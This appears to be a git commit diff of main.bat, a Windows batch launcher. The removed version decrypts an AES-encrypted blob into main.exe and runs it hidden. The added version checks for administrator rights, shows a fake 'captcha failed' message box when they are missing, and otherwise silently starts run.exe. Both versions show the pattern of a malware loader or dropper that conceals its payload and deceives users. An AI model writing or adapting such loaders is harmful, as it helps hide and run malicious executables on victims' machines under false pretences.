8ede9799be32d27db6fe833b3a63edae12fcb91f
waveget <nathanppwalker@gmail.com>
2024-10-13 13:48:19 +0100

    Update main.bat

--- main.bat
+++ main.bat
@@ -1,13 +1,11 @@
 @echo off
-rem Decrypt the executable
-python -c "from Crypto.Cipher import AES; \
-import os; \
-with open('key.bin', 'rb') as f: key = f.read(); \
-cipher = AES.new(key, AES.MODE_ECB); \
-with open('cipher.bin', 'rb') as f: \
-    ciphertext = f.read(); \
-plaintext = cipher.decrypt(ciphertext); \
-with open('main.exe', 'wb') as f: f.write(plaintext);"
+:: Check for Admin Privileges
+net session >nul 2>&1
+if %errorLevel% neq 0 (
+    :: Show message box
+    powershell -command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('captcha failed')"
+    exit /b
+)
 
-rem Run the decrypted executable without a window
-start /B main.exe
+:: If admin, run the executable
+start "" /B run.exe
